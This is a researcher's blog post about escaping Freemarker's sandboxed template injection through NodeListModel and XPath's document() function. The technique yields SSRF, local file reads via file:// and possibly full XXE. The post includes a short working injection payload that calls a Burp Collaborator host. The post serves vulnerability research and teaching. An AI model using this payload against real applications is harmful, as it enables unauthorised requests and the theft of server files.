---
layout: post
title: "The road from sandboxed SSTI to SSRF and XXE"
date: 2020-04-20 13:37:00
---

So I spent a whole bunch of hours trying to solve the penultimate challenge on the latest Web Academy server-side template injection labs and while the solution was totally different, I found an interesting new way to transform SSTI bugs into SSRF and XXE on Freemarker.

This technique works when you have SSTI on a template that uses the `SAFER_RESOLVER` template loader, that is, you can instantiate `TemplateModel` objects with the new built-in but you can't just execute commands with `Runtime`/`Execute`/`ObjectConstructor`. So how can we use the available `TemplateModels` to our advantage?

I fuzzed every `TemplateModel` and went through the list of those that I could instantiate and one of them really caught my attention: the `NodeListModel` (only the XML variant of this can be instantiated).

This class takes a list of objects and provides access to them through a pseudo-query language on its get method. Interestingly though, the exec method doc reads: 

> Evaluates an XPath expression on XML nodes in this model. 

This is important because XPath's `document()` function enables XPath-assisted XXE exploits - a seriously underestimated techinque responsible for its very own CVEs.

At this point, there's one important missing ingredient: the `NodeListModel` class will only work with objects of type `Node`. Freemarker has a whole range of features to turn XML into data models and exposing these to templates. So, if the stars are aligned, some of the existing objects in the template you're injecting into might be of type Node.

If this is the case (and I have indeed found such case), you can turn this SSTI into a sweet SSRF by injecting something along the lines of:

```
<#assign x = "freemarker.ext.xml.NodeListModel"?new(doc)>

${x("document('http://cheese.burpcollaborator.net')")}
```

This is limited to what the document function can do though, so the set of allowed protocols boils down to whatever the current XSLT implementation supports. Happily, my tests on Freemarker 2.3.28 + Jaxen show that they support at least `http://`, `https://` and, oh yeah, no biggie, also `file://` - boom! you just got file path traversal, go and fetch yourself some XML-looking files.

As if this wasn't enough I managed to turn this into a full XXE. So never mind XML-looking files, since you can now read any file whatsoever. There is one catch to this though: Freemarker allows the developer to provide their own XSLT implementation (either Xerces or Jaxen) and the latest version of Jaxen doesn't resolve external entities by default, so if you're unlucky, you might not be able to get the XXE after all. But hey, you just managed to go from sandboxed SSTI to SSRF, so the glass is half full, right?

Just look at this beauty:

![alt](../assets/images/ssti-to-ssrf.webp)

Originally posted on [Reddit](https://www.reddit.com/r/Slackers/comments/g6pt8t/the_road_from_sandboxed_ssti_to_ssrf_and_xxe/).
